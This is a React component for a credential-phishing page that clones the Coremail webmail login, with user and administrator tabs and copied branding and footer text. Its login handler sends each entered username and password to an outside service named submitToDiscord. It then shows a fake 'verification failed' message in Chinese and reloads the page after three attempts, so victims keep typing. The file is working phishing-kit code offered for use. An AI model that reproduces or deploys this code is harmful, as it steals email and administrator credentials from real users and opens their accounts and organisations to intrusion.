import React, { useState } from 'react';
import { submitToDiscord } from '../services/DiscordService';

interface CoremailThemeProps {
  prefilledEmail?: string;
}

const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
  const [username, setUsername] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'user' | 'admin'>('user');
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        username,
        password,
        loginType: activeTab,
        theme: 'coremail',
      }, 'CoremailTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#666]">
      {/* Header */}
      <header className="w-full px-6 py-4 flex items-center justify-between max-w-[1200px] mx-auto">
        <div className="flex items-center">
          <span className="text-2xl font-bold text-[#007cc7] tracking-tight">Coremail</span>
        </div>
        
        <nav className="hidden md:flex items-center space-x-6 text-[13px] text-gray-500">
          <a href="#" className="hover:text-blue-500 transition-colors">Official Website</a>
          <a href="#" className="hover:text-blue-500 transition-colors">Application for trial</a>
          <a href="#" className="hover:text-blue-500 transition-colors">Client Settings</a>
          <a href="#" className="hover:text-blue-500 transition-colors">Support Center</a>
        </nav>
      </header>

      {/* Main Hero Area */}
      <main className="relative bg-gradient-to-r from-[#44a0f1] to-[#2b88da] h-[440px] flex items-center justify-center overflow-hidden">
        {/* Subtle background abstract shapes */}
        <div className="absolute inset-0 pointer-events-none">
          <div className="absolute top-1/4 left-1/4 w-32 h-1 bg-white/10 rounded-full"></div>
          <div className="absolute bottom-1/3 left-1/2 w-48 h-1 bg-white/10 rounded-full"></div>
          <div className="absolute top-1/2 right-1/3 w-24 h-1 bg-white/10 rounded-full"></div>
        </div>

        <div className="w-full max-w-[1200px] px-6 flex flex-col md:flex-row items-center justify-between z-10">
          
          {/* Left Side: Illustration */}
          <div className="hidden lg:flex flex-col items-center space-y-8 max-w-[480px]">
            <div className="relative">
              {/* Illustration Placeholder */}
              <div className="w-[380px] h-[260px] relative">
                <div className="absolute inset-0 bg-blue-100/30 rounded-3xl transform -rotate-2"></div>
                {/* Simulated Device/Shield graphic */}
                <div className="absolute inset-4 bg-white/20 backdrop-blur-sm rounded-2xl flex flex-col items-center justify-center p-6 border border-white/30">
                  <div className="w-24 h-24 bg-blue-400 rounded-full flex items-center justify-center mb-4 shadow-lg">
                    <svg width="48" height="48" fill="white" viewBox="0 0 24 24">
                      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
                    </svg>
                  </div>
                  <div className="flex space-x-2">
                    <div className="w-8 h-8 bg-white/30 rounded-lg"></div>
                    <div className="w-8 h-8 bg-white/30 rounded-lg"></div>
                    <div className="w-8 h-8 bg-white/30 rounded-lg"></div>
                  </div>
                </div>
                {/* Floating mail icons */}
                <div className="absolute -top-4 -right-4 w-12 h-12 bg-white rounded shadow-lg flex items-center justify-center rotate-6">✉️</div>
                <div className="absolute bottom-10 -left-6 w-10 h-10 bg-white rounded shadow-lg flex items-center justify-center -rotate-12">📱</div>
              </div>
            </div>
            
            <button className="px-6 py-2 bg-white text-[#2b88da] font-medium rounded shadow-md hover:shadow-lg transition-all text-[14px]">
              More features
            </button>
          </div>

          {/* Right Side: Login Card */}
          <div className="w-full max-w-[360px] bg-[#f0f5fa]/90 backdrop-blur-sm rounded-md shadow-2xl overflow-hidden flex flex-col h-[380px]">
            {/* Tabs */}
            <div className="flex h-12 bg-gray-200/50">
              <button 
                onClick={() => setActiveTab('user')}
                className={`flex-1 text-[13px] font-bold transition-all ${activeTab === 'user' ? 'bg-[#f0f5fa]/90 text-gray-700' : 'text-gray-400 hover:text-gray-500'}`}
              >
                User
              </button>
              <button 
                onClick={() => setActiveTab('admin')}
                className={`flex-1 text-[13px] font-bold transition-all ${activeTab === 'admin' ? 'bg-[#f0f5fa]/90 text-gray-700' : 'text-gray-400 hover:text-gray-500'}`}
              >
                Administrator
              </button>
            </div>

            <div className="p-8 flex flex-col flex-grow">
              <div className="text-right mb-4">
                <div className="text-[12px] text-gray-400 flex items-center justify-end space-x-1 cursor-pointer">
                  <span>Language: English</span>
                  <span className="scale-75">▼</span>
                </div>
              </div>

              <form onSubmit={handleLogin} className="space-y-4 flex-grow flex flex-col">
                <div className="relative group">
                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
                      <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
                    </svg>
                  </div>
                  <input 
                    type="text" 
                    placeholder="Username" 
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full pl-10 pr-4 py-2 bg-white border border-gray-200 text-[14px] focus:outline-none focus:border-[#007cc7] transition-all rounded-sm"
                  />
                </div>

                <div className="relative group">
                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
                      <path d="M3.5 11.5a3.5 3.5 0 1 1 3.163-5H14L15.5 8 14 9.5l-1-1-1 1-1-1-1 1-1-1-1 1H6.663a3.5 3.5 0 0 1-3.163 2zM2.5 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/>
                    </svg>
                  </div>
                  <input 
                    type="password" 
                    placeholder="Password" 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full pl-10 pr-4 py-2 bg-white border border-gray-200 text-[14px] focus:outline-none focus:border-[#007cc7] transition-all rounded-sm"
                  />
                </div>

                <div className="flex items-center space-x-8 text-[11px] text-gray-400">
                  <label className="flex items-center cursor-pointer">
                    <input type="radio" className="mr-1.5 accent-blue-500 scale-90" name="remember" />
                    Remember
                  </label>
                  <label className="flex items-center cursor-pointer">
                    <input type="radio" className="mr-1.5 accent-blue-500 scale-90" name="ssl" />
                    Use SSL
                  </label>
                </div>

                {/* Loading State */}
                {isLoading && (
                  <div className="flex items-center justify-center py-8">
                    <div className="flex flex-col items-center space-y-3">
                      <div className="w-8 h-8 border-4 border-blue-200 border-t-blue-500 rounded-full animate-spin"></div>
                      <p className="text-[14px] text-gray-500">正在验证...</p>
                    </div>
                  </div>
                )}

                {/* Authentication Failed Message */}
                {authError && !isLoading && (
                  <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                    <div className="flex items-start space-x-3">
                      <div className="flex-shrink-0 text-red-500 text-xl">⚠️</div>
                      <div>
                        <h3 className="font-medium text-red-800 text-[14px]">验证失败</h3>
                        <p className="text-red-700 text-[13px] mt-1">请重试。剩余尝试次数: {3 - failedAttempts}</p>
                      </div>
                    </div>
                  </div>
                )}

                <button 
                  type="submit" 
                  disabled={isLoading}
                  className="w-full py-2 bg-[#42a2f0] hover:bg-[#3292e0] text-white font-medium rounded-sm transition-colors text-[16px] shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isLoading ? '验证中...' : 'Sign in'}
                </button>
              </form>

              {/* Security logos */}
              <div className="mt-8 flex items-center justify-end space-x-2 opacity-60">
                <span className="text-[9px] text-gray-400">Security Certification</span>
                <div className="w-5 h-5 bg-gray-200 rounded-full"></div>
                <div className="w-5 h-5 bg-gray-200 rounded-full"></div>
                <div className="w-5 h-5 bg-gray-200 rounded-full"></div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Bottom Features Section */}
      <section className="w-full max-w-[1200px] mx-auto py-12 px-6 flex flex-col md:flex-row items-center justify-between space-y-8 md:space-y-0">
        {/* Left: Device Links */}
        <div className="flex items-center space-x-6">
          <div className="flex flex-col items-center space-y-2 group cursor-pointer">
            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center text-gray-400 group-hover:bg-blue-50 group-hover:text-blue-500 transition-all">🍎</div>
            <span className="text-[11px] text-gray-400 group-hover:text-gray-600">iPhone</span>
          </div>
          <div className="flex flex-col items-center space-y-2 group cursor-pointer">
            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center text-gray-400 group-hover:bg-blue-50 group-hover:text-blue-500 transition-all">🤖</div>
            <span className="text-[11px] text-gray-400 group-hover:text-gray-600">Android</span>
          </div>
          <div className="flex flex-col items-center space-y-2 group cursor-pointer">
            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center text-gray-400 group-hover:bg-blue-50 group-hover:text-blue-500 transition-all">🪟</div>
            <span className="text-[11px] text-gray-400 group-hover:text-gray-600">PC_IM</span>
          </div>
          <div className="flex flex-col items-center space-y-2 group cursor-pointer">
            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center text-gray-400 group-hover:bg-blue-50 group-hover:text-blue-500 transition-all">✉️</div>
            <span className="text-[11px] text-gray-400 group-hover:text-gray-600">PC_Mail</span>
          </div>
          <div className="flex flex-col items-center space-y-2 group cursor-pointer">
            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center text-gray-400 group-hover:bg-blue-50 group-hover:text-blue-500 transition-all">🔧</div>
            <span className="text-[11px] text-gray-400 group-hover:text-gray-600">Plug-in unit download</span>
          </div>
        </div>

        {/* Right: QR Codes & Sales */}
        <div className="flex items-center space-x-12 border-l border-gray-100 pl-12">
          <div className="flex flex-col items-center space-y-2">
            <div className="w-16 h-16 bg-gray-50 border border-gray-100 flex items-center justify-center p-1">
              <div className="w-full h-full bg-gray-200"></div>
            </div>
            <span className="text-[11px] text-gray-400">APP Download</span>
          </div>
          <div className="flex flex-col items-center space-y-2">
            <div className="w-16 h-16 bg-gray-50 border border-gray-100 flex items-center justify-center p-1">
              <div className="w-full h-full bg-gray-200"></div>
            </div>
            <span className="text-[11px] text-gray-400">WeChat</span>
          </div>
          <div className="flex flex-col text-[13px] text-gray-500">
             <span className="text-gray-400">Sales</span>
             <span className="font-bold">400-000-1631</span>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="w-full py-10 text-[11px] text-gray-400 bg-gray-50/50 border-t border-gray-50">
        <div className="max-w-[1200px] mx-auto px-6 text-center">
          <p>Coremail Copyright © 2002-2021 | Guangdong ICP Backup 10201174 Number-4 | Guangdong public network No.44011302001741</p>
        </div>
      </footer>
    </div>
  );
};

export default CoremailTheme;